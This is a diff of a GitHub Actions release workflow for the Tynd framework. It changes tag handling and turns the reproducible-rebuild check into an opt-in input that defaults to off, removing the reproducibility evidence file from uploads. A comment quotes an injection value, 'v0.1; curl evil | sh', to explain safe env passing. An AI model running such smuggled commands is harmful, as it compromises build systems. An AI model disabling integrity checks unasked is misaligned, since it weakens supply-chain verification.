@@ -1,17 +1,18 @@
 name: Release — Tynd framework (native tooling + npm packages)
 
 on:
-  push:
-    tags:
-      - "v*"
   workflow_dispatch:
     inputs:
       tag:
         description: "Tag to build and publish (e.g. v0.1.0)"
         required: true
+      verify_reproducibility:
+        description: "Clean rebuild and compare all native tool binaries"
+        type: boolean
+        default: false
 
 concurrency:
-  group: release-${{ github.event_name == 'workflow_dispatch' && inputs.tag || github.ref }}
+  group: release-${{ inputs.tag }}
   cancel-in-progress: false
 
 permissions:
@@ -41,14 +42,14 @@ jobs:
           no-cache: true
       - name: Bind checkout to workflow commit
         env:
-          TAG: ${{ github.event_name == 'workflow_dispatch' && inputs.tag || github.ref_name }}
+          TAG: ${{ inputs.tag }}
         run: |
           set -euo pipefail
           test "$(git rev-parse HEAD)" = "$GITHUB_SHA"
-          test "$(git rev-parse "$TAG^{commit}")" = "$GITHUB_SHA"
+          test "$(git rev-parse "refs/tags/$TAG^{commit}")" = "$GITHUB_SHA"
       - name: Match tag to framework and native tooling versions
         env:
-          TAG: ${{ github.event_name == 'workflow_dispatch' && inputs.tag || github.ref_name }}
+          TAG: ${{ inputs.tag }}
         shell: bash
         run: |
           bun scripts/check-release-version.ts framework "$TAG"
@@ -65,6 +66,8 @@ jobs:
               --repo "$GITHUB_REPOSITORY" \
               --workflow ci.yml \
               --commit "$GITHUB_SHA" \
+              --event push \
+              --branch main \
               --status success \
               --limit 1 \
               --json headSha
@@ -168,6 +171,7 @@ jobs:
         run: cross build --locked --release --target ${{ matrix.target }} -p tynd-bundler
 
       - name: Record native tooling digests before clean rebuild
+        if: inputs.verify_reproducibility
         shell: bash
         run: |
           bun scripts/check-reproducible-artifact.ts record \
@@ -181,23 +185,25 @@ jobs:
             "$RUNNER_TEMP/bundler-digest.json"
 
       - name: Clean native tooling outputs
+        if: inputs.verify_reproducibility
         run: |
           cargo clean --locked --release --target ${{ matrix.target }} -p tynd-cli
           cargo clean --locked --release --target ${{ matrix.target }} -p tynd-bundler
 
       - name: Rebuild native tooling
-        if: ${{ !matrix.cross }}
+        if: ${{ inputs.verify_reproducibility && !matrix.cross }}
         run: |
           cargo build --locked --release --target ${{ matrix.target }} -p tynd-cli --bins
           cargo build --locked --release --target ${{ matrix.target }} -p tynd-bundler
 
       - name: Cross-rebuild native tooling
-        if: matrix.cross
+        if: inputs.verify_reproducibility && matrix.cross
         run: |
           cross build --locked --release --target ${{ matrix.target }} -p tynd-cli --bins
           cross build --locked --release --target ${{ matrix.target }} -p tynd-bundler
 
       - name: Verify reproducible native tooling
+        if: inputs.verify_reproducibility
         shell: bash
         run: |
           bun scripts/check-reproducible-artifact.ts verify \
@@ -260,11 +266,6 @@ jobs:
           $hash = (Get-FileHash -Algorithm SHA256 "${{ matrix.bundler_asset }}").Hash.ToLower()
           "$hash  ${{ matrix.bundler_asset }}" | Out-File -Encoding ascii -NoNewline "${{ matrix.bundler_asset }}.sha256"
 
-      - name: Stage bundler reproducibility evidence
-        working-directory: target/${{ matrix.target }}/release
-        shell: bash
-        run: cp "$RUNNER_TEMP/bundler-digest.json" bundler-reproducibility.json
-
       - name: Attest bundler release asset
         uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # v2.4.0
         with:
@@ -272,7 +273,7 @@ jobs:
             target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}
             target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}.sha256
 
-      - name: Upload bundler reproducibility evidence
+      - name: Upload bundler release evidence
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
         with:
           name: bundler-evidence-${{ matrix.target }}
@@ -280,7 +281,6 @@ jobs:
             target/${{ matrix.target }}/release/${{ matrix.bundler_artifact }}
             target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}
             target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}.sha256
-            target/${{ matrix.target }}/release/bundler-reproducibility.json
           if-no-files-found: error
           retention-days: 30
 
@@ -349,7 +349,7 @@ jobs:
               ]
             }' < "$subjects_tsv" > "$root/attestations.json"
 
-      - name: Validate reproducibility, checksums, and provenance
+      - name: Validate binary contents, checksums and provenance
         run: |
           bun scripts/check-release-provenance-evidence.ts \
             --root .tynd/release-evidence \
@@ -535,7 +535,7 @@ jobs:
           # Pass user-supplied tag via env, not `${{ … }}` interpolation —
           # `workflow_dispatch.inputs.tag` lands directly in the shell
           # otherwise and a value like `v0.1; curl evil | sh` would run.
-          TAG: ${{ github.event_name == 'workflow_dispatch' && inputs.tag || github.ref_name }}
+          TAG: ${{ inputs.tag }}
         run: |
           if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
             echo "GitHub release $TAG already exists"
@@ -546,7 +546,7 @@ jobs:
       - name: Upload verified bundler assets to GitHub Release
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          TAG: ${{ github.event_name == 'workflow_dispatch' && inputs.tag || github.ref_name }}
+          TAG: ${{ inputs.tag }}
         shell: bash
         run: |
           set -euo pipefail
